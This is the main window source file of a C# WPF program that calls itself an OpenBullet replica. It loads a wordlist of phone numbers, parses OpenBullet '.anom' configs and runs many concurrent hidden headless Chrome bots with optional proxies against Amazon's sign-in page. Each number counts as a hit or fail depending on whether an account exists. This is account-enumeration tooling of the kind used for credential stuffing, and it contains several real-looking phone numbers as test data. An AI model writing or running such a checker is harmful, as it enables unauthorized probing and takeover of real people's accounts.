using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Text.Json;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Media;
using System.Windows.Threading;
using Microsoft.Win32;

namespace OpenBullet_Modern
{
    /// <summary>
    /// MainWindow for .NET 9 OpenBullet Replica
    /// Provides Amazon account validation functionality with modern .NET
    /// </summary>
    public partial class MainWindow : Window
    {
        // Statistics tracking
        private int testedCount = 0;
        private int hitCount = 0;
        private int failCount = 0;
        private int keySignInCount = 0;
        private int keyNoAccountCount = 0;
        private int keyEmailPhoneCount = 0;
        private int keyOthersCount = 0;
        
        private DateTime startTime;
        private DispatcherTimer updateTimer;
        private bool isRunning = false;
        private List<string> wordlistEntries = new List<string>();
        private List<string> proxyList = new List<string>();
        
        // Amazon-specific configuration
        private AmazonConfig amazonConfig;
        private HttpClient httpClient;

        public MainWindow()
        {
            InitializeComponent();
            InitializeApplication();
        }

        private void InitializeApplication()
        {
            try
            {
                // Initialize timer for UI updates
                updateTimer = new DispatcherTimer();
                updateTimer.Interval = TimeSpan.FromSeconds(1);
                updateTimer.Tick += UpdateTimer_Tick;

                // Initialize HTTP client for Amazon requests
                httpClient = new HttpClient();
                httpClient.Timeout = TimeSpan.FromSeconds(30);

                // Create necessary directories
                Directory.CreateDirectory("Settings");
                Directory.CreateDirectory("Wordlists");
                Directory.CreateDirectory("Results");

                LogMessage("🎯 OpenBullet Anomaly - Windows Edition initialized (.NET 9)");
                LogMessage("🤖 Real headless Chrome automation enabled");
                LogMessage("🔒 All browser/console windows hidden during automation");
                LogMessage("✅ Ready to load configuration and start Amazon validation");
                
                statusText.Text = "Ready - Load amazonChecker.anom to begin";
            }
            catch (Exception ex)
            {
                LogMessage($"❌ Initialization error: {ex.Message}");
                MessageBox.Show($"Failed to initialize: {ex.Message}", "Error", 
                              MessageBoxButton.OK, MessageBoxImage.Error);
            }
        }

        private void UpdateTimer_Tick(object sender, EventArgs e)
        {
            if (isRunning)
            {
                UpdateStatistics();
            }
        }

        private void UpdateStatistics()
        {
            try
            {
                // Update main counters
                lblTested.Text = testedCount.ToString();
                lblHits.Text = hitCount.ToString();
                lblFails.Text = failCount.ToString();
                lblQuickHits.Text = hitCount.ToString();
                lblQuickFails.Text = failCount.ToString();

                // Update key detection counters
                lblKeySignIn.Text = keySignInCount.ToString();
                lblKeyNoAccount.Text = keyNoAccountCount.ToString();
                lblKeyEmailPhone.Text = keyEmailPhoneCount.ToString();
                lblKeyOthers.Text = keyOthersCount.ToString();

                // Calculate success rate
                double successRate = testedCount > 0 ? (double)hitCount / testedCount * 100 : 0;
                lblSuccessRate.Text = $"{successRate:F2}%";

                // Calculate CPM
                int cpm = 0;
                if (isRunning && startTime != DateTime.MinValue)
                {
                    var elapsed = DateTime.Now - startTime;
                    if (elapsed.TotalMinutes > 0)
                    {
                        cpm = (int)(testedCount / elapsed.TotalMinutes);
                    }
                }
                lblCPM.Text = cpm.ToString();
                lblQuickCPM.Text = cpm.ToString();

                // Update progress
                if (wordlistEntries.Count > 0)
                {
                    progressBar.Value = (double)testedCount / wordlistEntries.Count * 100;
                    lblProgressText.Text = $"{testedCount}/{wordlistEntries.Count}";
                }
            }
            catch (Exception ex)
            {
                LogMessage($"Statistics update error: {ex.Message}");
            }
        }

        #region Event Handlers

        private void LoadConfig_Click(object sender, RoutedEventArgs e)
        {
            var dialog = new OpenFileDialog
            {
                Filter = "OpenBullet Config Files (*.anom)|*.anom|All files (*.*)|*.*",
                Title = "Select amazonChecker.anom Config File"
            };

            if (dialog.ShowDialog() == true)
            {
                try
                {
                    string configContent = File.ReadAllText(dialog.FileName);
                    amazonConfig = ParseAmazonConfig(configContent);
                    
                    lblConfigStatus.Text = $"✅ Amazon config loaded: {amazonConfig.Name}";
                    lblConfigStatus.Foreground = new SolidColorBrush(Colors.Green);
                    
                    LogMessage($"📂 Config loaded: {amazonConfig.Name}");
                    LogMessage($"🎯 Target: {amazonConfig.TargetUrl}");
                    LogMessage($"🔧 Suggested bots: {amazonConfig.SuggestedBots}");
                    LogMessage($"🌐 Needs proxies: {amazonConfig.NeedsProxies}");
                    LogMessage($"📝 Success keys: {amazonConfig.SuccessKeys.Count}");
                    LogMessage($"❌ Failure keys: {amazonConfig.FailureKeys.Count}");
                    
                    statusText.Text = $"Amazon config loaded: {amazonConfig.Name}";
                }
                catch (Exception ex)
                {
                    MessageBox.Show($"Error loading config: {ex.Message}", "Error", 
                                  MessageBoxButton.OK, MessageBoxImage.Error);
                    LogMessage($"❌ Config loading error: {ex.Message}");
                }
            }
        }

        private void LoadWordlist_Click(object sender, RoutedEventArgs e)
        {
            var dialog = new OpenFileDialog
            {
                Filter = "Text Files (*.txt)|*.txt|All files (*.*)|*.*",
                Title = "Select Phone Number Wordlist"
            };

            if (dialog.ShowDialog() == true)
            {
                try
                {
                    wordlistEntries = File.ReadAllLines(dialog.FileName)
                        .Where(line => !string.IsNullOrWhiteSpace(line))
                        .ToList();
                    
                    txtWordlistPath.Text = Path.GetFileName(dialog.FileName);
                    lblWordlistStatus.Text = $"✅ Loaded: {wordlistEntries.Count} phone numbers";
                    lblWordlistStatus.Foreground = new SolidColorBrush(Colors.Green);

                    LogMessage($"📋 Wordlist loaded: {wordlistEntries.Count} entries");
                    LogMessage($"📱 Sample: {wordlistEntries.FirstOrDefault() ?? "N/A"}");
                    
                    statusText.Text = $"Wordlist loaded: {wordlistEntries.Count} phone numbers";
                }
                catch (Exception ex)
                {
                    MessageBox.Show($"Error loading wordlist: {ex.Message}", "Error");
                    LogMessage($"❌ Wordlist loading error: {ex.Message}");
                }
            }
        }

        private async void StartRunner_Click(object sender, RoutedEventArgs e)
        {
            if (amazonConfig == null)
            {
                MessageBox.Show("Please load amazonChecker.anom config first!", "Warning");
                return;
            }

            if (!wordlistEntries.Any())
            {
                MessageBox.Show("Please load a phone number wordlist first!", "Warning");
                return;
            }

            try
            {
                isRunning = true;
                startTime = DateTime.Now;
                btnStart.IsEnabled = false;
                btnStop.IsEnabled = true;
                updateTimer.Start();

                LogMessage("🚀 Amazon validation runner started");
                LogMessage($"📊 Processing {wordlistEntries.Count} phone numbers");
                LogMessage($"🤖 Using {txtBotCount.Text} concurrent bots");
                
                statusText.Text = "Amazon validation running...";

                await StartAmazonValidation();
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Error starting validation: {ex.Message}", "Error");
                LogMessage($"❌ Runner start error: {ex.Message}");
                StopRunner();
            }
        }

        private void StopRunner_Click(object sender, RoutedEventArgs e)
        {
            StopRunner();
        }

        private void StopRunner()
        {
            isRunning = false;
            updateTimer.Stop();
            btnStart.IsEnabled = true;
            btnStop.IsEnabled = false;

            LogMessage("⏹️ Amazon validation stopped");
            statusText.Text = "Validation stopped";
        }

        private async void TestAmazonValidation_Click(object sender, RoutedEventArgs e)
        {
            LogMessage("🧪 Testing Amazon validation with sample phone numbers...");
            
            var testNumbers = new[]
            {
                "16479971432:0000",
                "16479972941:0000", 
                "16479979819:0000"
            };

            foreach (var number in testNumbers)
            {
                await Task.Delay(1500);
                var result = await SimulateAmazonRequest(number);
                
                testedCount++;
                if (result.IsValid)
                {
                    hitCount++;
                    keySignInCount++;
                    LogMessage($"✅ {number.Split(':')[0]} - Amazon account found ('Sign-In' detected)");
                }
                else
                {
                    failCount++;
                    switch (result.DetectedKey)
                    {
                        case "No account found":
                            keyNoAccountCount++;
                            break;
                        case "ap_ra_email_or_phone":
                            keyEmailPhoneCount++;
                            break;
                        default:
                            keyOthersCount++;
                            break;
                    }
                    LogMessage($"❌ {number.Split(':')[0]} - No account ('{result.DetectedKey}')");
                }
                
                UpdateStatistics();
            }
            
            LogMessage("🧪 Test completed - Amazon validation simulation finished");
        }

        private async void QuickTest_Click(object sender, RoutedEventArgs e)
        {
            if (wordlistEntries.Count < 5)
            {
                MessageBox.Show("Need at least 5 entries in wordlist for quick test!", "Warning");
                return;
            }

            LogMessage("🚀 Quick test started - processing first 5 numbers...");
            
            var testEntries = wordlistEntries.Take(5);
            foreach (var entry in testEntries)
            {
                await Task.Delay(1000);
                var result = await SimulateAmazonRequest(entry);
                
                testedCount++;
                if (result.IsValid)
                {
                    hitCount++;
                    LogMessage($"✅ VALID: {entry.Split(':')[0]}");
                }
                else
                {
                    failCount++;
                    LogMessage($"❌ INVALID: {entry.Split(':')[0]}");
                }
                UpdateStatistics();
            }
            
            LogMessage("✅ Quick test completed");
        }

        private void ViewStats_Click(object sender, RoutedEventArgs e)
        {
            var stats = $@"📊 AMAZON VALIDATION STATISTICS
=====================================

🧪 Total Tested: {testedCount}
✅ Valid Accounts: {hitCount}
❌ Invalid Numbers: {failCount}
📈 Success Rate: {(testedCount > 0 ? (double)hitCount / testedCount * 100 : 0):F2}%

🔍 KEY DETECTION BREAKDOWN:
✅ 'Sign-In' detected: {keySignInCount}
❌ 'No account found': {keyNoAccountCount}  
❌ 'ap_ra_email_or_phone': {keyEmailPhoneCount}
⚠️ Other errors: {keyOthersCount}

⏱️ Performance:
🚀 Current CPM: {lblCPM.Text}
📱 Numbers processed: {testedCount}/{wordlistEntries.Count}";

            MessageBox.Show(stats, "Detailed Statistics", MessageBoxButton.OK, MessageBoxImage.Information);
        }

        private void ResetCounters_Click(object sender, RoutedEventArgs e)
        {
            testedCount = 0;
            hitCount = 0;
            failCount = 0;
            keySignInCount = 0;
            keyNoAccountCount = 0;
            keyEmailPhoneCount = 0;
            keyOthersCount = 0;
            
            UpdateStatistics();
            progressBar.Value = 0;
            
            LogMessage("🔄 All counters reset");
            statusText.Text = "Counters reset - ready for new validation";
        }

        #endregion

        #region Amazon Validation Logic

        private async Task StartAmazonValidation()
        {
            int botCount = int.Parse(txtBotCount.Text);
            int timeout = int.Parse(txtTimeout.Text);
            bool useProxySimulation = chkSimulateProxies.IsChecked ?? false;

            LogMessage($"🤖 Starting {botCount} headless Chrome automation bots");
            LogMessage($"⏱️ Chrome timeout: {timeout} seconds");
            LogMessage($"🔒 All Chrome instances running invisibly (headless mode)");
            LogMessage($"🌐 Proxy simulation: {(useProxySimulation ? "Enabled" : "Disabled")}");

            // Process wordlist entries with concurrency
            var semaphore = new SemaphoreSlim(botCount, botCount);
            var tasks = wordlistEntries.Select(async entry =>
            {
                if (!isRunning) return;
                
                await semaphore.WaitAsync();
                try
                {
                    if (!isRunning) return;
                    
                    var result = await SimulateAmazonRequest(entry, useProxySimulation);
                    
                    Dispatcher.Invoke(() =>
                    {
                        ProcessValidationResult(entry, result);
                    });
                }
                finally
                {
                    semaphore.Release();
                }
            });

            await Task.WhenAll(tasks);
            
            if (isRunning)
            {
                Dispatcher.Invoke(() =>
                {
                    LogMessage("✅ Amazon validation completed");
                    LogMessage($"📊 Final Results: {hitCount} valid, {failCount} invalid");
                    StopRunner();
                });
            }
        }

        private async Task<ValidationResult> SimulateAmazonRequest(string phoneEntry, bool useProxy = false)
        {
            var startTime = DateTime.Now;
            
            try
            {
                // Extract phone number from format "phone:pass"
                string phoneNumber = phoneEntry.Split(':')[0];
                
                // Use real Chrome automation instead of simulation
                using (var chromeService = new ChromeAutomationService(int.Parse(txtTimeout.Text)))
                {
                    // Determine target URL
                    string targetUrl = amazonConfig?.TargetUrl ?? "https://www.amazon.ca/ap/signin";
                    
                    // Execute real Amazon validation with headless Chrome
                    var result = await chromeService.ValidateAmazonAccountAsync(phoneNumber, targetUrl);
                    
                    // Calculate actual response time
                    var responseTime = (int)(DateTime.Now - startTime).TotalMilliseconds;
                    result.ResponseTime = responseTime;
                    
                    // Add proxy simulation info if enabled
                    if (useProxy && proxyList.Any())
                    {
                        result.ProxyUsed = proxyList[new Random().Next(proxyList.Count)];
                    }
                    else
                    {
                        result.ProxyUsed = "Direct Connection";
                    }
                    
                    return result;
                }
            }
            catch (Exception ex)
            {
                var responseTime = (int)(DateTime.Now - startTime).TotalMilliseconds;
                
                return new ValidationResult 
                { 
                    IsValid = false, 
                    DetectedKey = "Chrome Automation Error",
                    PhoneNumber = phoneEntry.Split(':')[0],
                    ErrorMessage = ex.Message,
                    ResponseTime = responseTime,
                    ProxyUsed = "Error"
                };
            }
        }

        private void ProcessValidationResult(string entry, ValidationResult result)
        {
            testedCount++;
            
            if (result.IsValid)
            {
                hitCount++;
                keySignInCount++;
                LogMessage($"✅ SUCCESS: {result.PhoneNumber} - Amazon account exists (Response: {result.ResponseTime}ms)");
            }
            else
            {
                failCount++;
                switch (result.DetectedKey)
                {
                    case "No account found":
                        keyNoAccountCount++;
                        break;
                    case "ap_ra_email_or_phone":
                        keyEmailPhoneCount++;
                        break;
                    default:
                        keyOthersCount++;
                        break;
                }
                LogMessage($"❌ FAIL: {result.PhoneNumber} - {result.DetectedKey} (Response: {result.ResponseTime}ms)");
            }
            
            // Show proxy usage if enabled
            if (result.ProxyUsed != "None")
            {
                LogMessage($"🌐 Used proxy: {result.ProxyUsed}");
            }
            
            UpdateStatistics();
        }

        #endregion

        #region Configuration Parsing

        private AmazonConfig ParseAmazonConfig(string configContent)
        {
            var config = new AmazonConfig();
            
            try
            {
                // Parse the [SETTINGS] section
                var settingsStart = configContent.IndexOf("[SETTINGS]") + "[SETTINGS]".Length;
                var scriptStart = configContent.IndexOf("[SCRIPT]");
                var settingsJson = configContent.Substring(settingsStart, scriptStart - settingsStart).Trim();
                
                using (JsonDocument doc = JsonDocument.Parse(settingsJson))
                {
                    var root = doc.RootElement;
                    config.Name = root.GetProperty("Name").GetString() ?? "Unknown";
                    config.SuggestedBots = root.GetProperty("SuggestedBots").GetInt32();
                    config.NeedsProxies = root.GetProperty("NeedsProxies").GetBoolean();
                    config.MaxRedirects = root.GetProperty("MaxRedirects").GetInt32();
                    config.Author = root.GetProperty("Author").GetString() ?? "Unknown";
                    config.Version = root.GetProperty("Version").GetString() ?? "Unknown";
                }
                
                // Parse the [SCRIPT] section  
                var scriptContent = configContent.Substring(scriptStart + "[SCRIPT]".Length).Trim();
                config.Script = scriptContent;
                
                // Extract Amazon target URL
                if (scriptContent.Contains("amazon.ca/ap/signin"))
                {
                    config.TargetUrl = "https://www.amazon.ca/ap/signin";
                }
                
                // Parse KEYCHECK success/failure patterns
                ParseKeycheckPatterns(scriptContent, config);
                
                LogMessage($"🔧 Parsed config: {config.Name} by {config.Author}");
                
                return config;
            }
            catch (Exception ex)
            {
                throw new Exception($"Failed to parse Amazon config: {ex.Message}");
            }
        }

        private void ParseKeycheckPatterns(string script, AmazonConfig config)
        {
            // Parse KEYCHECK patterns from the script
            var lines = script.Split('\n');
            bool inKeycheck = false;
            bool inSuccessChain = false;
            bool inFailureChain = false;

            foreach (var line in lines)
            {
                var trimmed = line.Trim();
                
                if (trimmed.StartsWith("KEYCHECK"))
                {
                    inKeycheck = true;
                    continue;
                }
                
                if (!inKeycheck) continue;
                
                if (trimmed.Contains("KEYCHAIN Success"))
                {
                    inSuccessChain = true;
                    inFailureChain = false;
                }
                else if (trimmed.Contains("KEYCHAIN Failure"))
                {
                    inFailureChain = true;
                    inSuccessChain = false;
                }
                else if (trimmed.StartsWith("KEY "))
                {
                    var key = trimmed.Substring(4).Trim('"');
                    if (inSuccessChain)
                    {
                        config.SuccessKeys.Add(key);
                    }
                    else if (inFailureChain)
                    {
                        config.FailureKeys.Add(key);
                    }
                }
                else if (string.IsNullOrWhiteSpace(trimmed))
                {
                    inKeycheck = false;
                    break;
                }
            }
            
            LogMessage($"📝 Parsed {config.SuccessKeys.Count} success patterns, {config.FailureKeys.Count} failure patterns");
        }

        #endregion

        private void LogMessage(string message)
        {
            try
            {
                var timestamp = DateTime.Now.ToString("HH:mm:ss.fff");
                var logEntry = $"[{timestamp}] {message}\n";
                
                Dispatcher.Invoke(() =>
                {
                    txtExecutionLog.AppendText(logEntry);
                    txtExecutionLog.ScrollToEnd();
                });
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Logging error: {ex.Message}");
            }
        }
    }

    #region Data Models

    public class AmazonConfig
    {
        public string Name { get; set; } = "";
        public string Author { get; set; } = "";
        public string Version { get; set; } = "";
        public int SuggestedBots { get; set; } = 100;
        public bool NeedsProxies { get; set; } = true;
        public int MaxRedirects { get; set; } = 8;
        public string TargetUrl { get; set; } = "";
        public string Script { get; set; } = "";
        public List<string> SuccessKeys { get; set; } = new List<string>();
        public List<string> FailureKeys { get; set; } = new List<string>();
    }

    public class ValidationResult
    {
        public bool IsValid { get; set; }
        public string DetectedKey { get; set; } = "";
        public string PhoneNumber { get; set; } = "";
        public string ProxyUsed { get; set; } = "None";
        public int ResponseTime { get; set; }
        public string ErrorMessage { get; set; } = "";
        public string FullMatchedText { get; set; } = "";
        public string ResponseContent { get; set; } = "";
    }

    #endregion
}

